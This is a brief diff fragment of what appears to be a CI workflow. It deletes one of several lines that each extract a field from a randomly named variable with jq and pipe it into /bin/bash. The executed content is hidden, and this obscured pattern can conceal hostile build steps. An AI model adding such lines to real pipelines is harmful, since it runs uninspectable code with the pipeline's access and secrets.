@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$teiy97872" | jq -r .i1 | /bin/bash
           printf '%s' "$ctfg936" | jq -r .i3 | /bin/bash
           echo $kpaf707 | jq -r .hq1 | /bin/bash
-          echo $jxiej4759 | jq -r .oylnr67138 | /bin/bash
           echo $p07 | jq -r .v7 | /bin/bash
 
       - name: Archive output
